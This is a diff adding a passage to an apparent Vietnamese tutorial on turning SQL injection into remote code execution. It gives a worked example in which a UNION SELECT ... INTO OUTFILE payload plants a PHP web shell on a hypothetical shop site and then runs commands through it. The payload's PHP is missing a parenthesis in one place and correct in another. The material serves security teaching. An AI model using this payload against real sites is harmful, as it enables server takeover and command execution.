@@ -53,6 +53,47 @@ Chúng ta sẽ không thể chèn file `shell.php` kia vào trong thư mục `va
 
 Đấy là đối với hệ quản trị cơ sở dữ liệu MySQL . 
 
+Giả sử một web bán hàng sử tham số id để hiển thị thông tin sản phẩm
+```sql
+SELECT * FROM products where id = 1
+```
+Nếu ở đây chúng ta bắt buộc phải sử dụng dấu `;` để kết thúc câu lệnh trước vì không thể sử dụng UNION ở đây thì bắt buộc ở phía backend phải dùng
+
+Đối với php
+```
+mysql_multi_query("truy_vấn_1 ; truy_vấn_2 ; ...")
+```
+
+
+Ví dụ:
+
+Một website `shop.com` . Với chức năng xem chi tiết sản phẩm
+
+```
+http:shop.com/product.php?id=1
+```
+Ở đây có lỗi SQL injection ở tham số id . Nếu chúng ta truyền vào :
+```sql
+1000 UNION SELECT "<?php system($_GET['cmd']; ?>",2,3 INTO OUTFILE '/var/www/html/shell.php'
+```
+Giải thích lệnh này:
+
+ -  `UNION SELECT "<?php....?>"` : tạo ra một chuỗi văn bản 
+
+ -  `INTO OUTFILE '/var/www/html/shell.php'`: đặt tên là `shell.php` vào bên trong thư mục web `/var/www/html` 
+
+Lúc này câu truy vấn đưa vào trong Database sẽ là
+```
+SELECT * FROM products WHERE id = 1000 UNION SELECT "<?php...?>",2,3 INTO OUTFILE '/var/www/html/shell.php'
+```
+
+Nội dung bên trong `shell.php` sẽ trông như thế nàt
+```
+<?php system($_GET['cmd']); ?>	2	3
+```
+
+Kết quả là khi chúng ta truy cập vào `http://shop.com/shell.php?cmd=whoami` thì Web server(như Apache) nó nhìn thấy đuôi `.php` thì nó liền gọi Engine của php lên và thực thi nội dung bên trong file đấy . Trình duyệt hiện ra kết quả của câu lệnh `whoami` đấy là `root` hoặc `www-data`
+
 # 2.2. SỬ DỤNG XP_CMDSHELL ĐỐI VỚI MSSQL 
 
 Đối với hệ quản trị cơ sở dữ liệu MSSQL , thì lệnh để thực thi RCE nó sẽ là 
